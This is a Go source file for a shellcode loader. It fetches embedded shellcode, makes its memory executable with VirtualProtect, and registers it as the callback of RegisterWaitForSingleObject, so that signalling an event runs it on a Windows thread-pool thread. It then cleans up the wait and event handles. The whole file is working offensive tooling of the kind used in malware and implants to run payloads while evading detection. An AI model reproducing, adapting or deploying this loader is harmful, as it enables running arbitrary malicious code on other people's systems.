package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

var (
	waitHandle uintptr
	eventHandle uintptr
)

func ExecuteViaWaitObject() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	eventHandle, err = api.Call("kernel32.dll", "CreateEventW",
		uintptr(0),     // lpEventAttributes (default security)
		uintptr(0),     // bManualReset (auto-reset event)
		uintptr(0),     // bInitialState (non-signaled)
		uintptr(0),     // lpName (unnamed)
	)
	if err != nil || eventHandle == 0 {
		return fmt.Errorf("CreateEventW failed: %v", err)
	}
	
	success, err = api.Call("kernel32.dll", "RegisterWaitForSingleObject",
		uintptr(unsafe.Pointer(&waitHandle)), // phNewWaitObject
		eventHandle,                          // hObject (our event)
		shellcodePtr,                         // Callback (our shellcode)
		uintptr(0),                           // Context
		uintptr(0xFFFFFFFF),                 // dwMilliseconds (INFINITE)
		uintptr(0x00000008),                 // dwFlags (WT_EXECUTEONLYONCE)
	)
	if err != nil || success == 0 {
		return fmt.Errorf("RegisterWaitForSingleObject failed: %v", err)
	}
	
	time.Sleep(10 * time.Millisecond)
	
	success, err = api.Call("kernel32.dll", "SetEvent", eventHandle)
	if err != nil || success == 0 {
		return fmt.Errorf("SetEvent failed: %v", err)
	}
	
	time.Sleep(100 * time.Millisecond)
	
	return cleanupWaitObject()
}

func cleanupWaitObject() error {
	var err error
	
	if waitHandle != 0 {
		success, e := api.Call("kernel32.dll", "UnregisterWait", waitHandle)
		if e != nil || success == 0 {
			fmt.Printf("Warning: UnregisterWait failed: %v\n", e)
		}
		waitHandle = 0
	}
	
	if eventHandle != 0 {
		success, e := api.Call("kernel32.dll", "CloseHandle", eventHandle)
		if e != nil || success == 0 {
			err = fmt.Errorf("CloseHandle failed: %v", e)
		}
		eventHandle = 0
	}
	
	return err
}